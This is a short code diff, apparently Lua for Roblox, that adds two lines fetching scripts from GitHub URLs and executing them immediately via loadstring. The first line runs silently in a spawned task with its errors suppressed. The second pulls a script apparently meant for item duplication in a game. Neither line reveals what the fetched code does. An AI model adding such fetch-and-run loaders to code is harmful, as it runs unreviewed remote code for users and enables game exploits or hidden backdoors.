@@ -1,0 +1,2 @@
+task.spawn(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Xyraniz/Roblox/main/Scripts/Games/Universal/Synergy-Hub.luau"))() end) end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VampProject-Script/Sab-dupe/refs/heads/main/Gg"))()
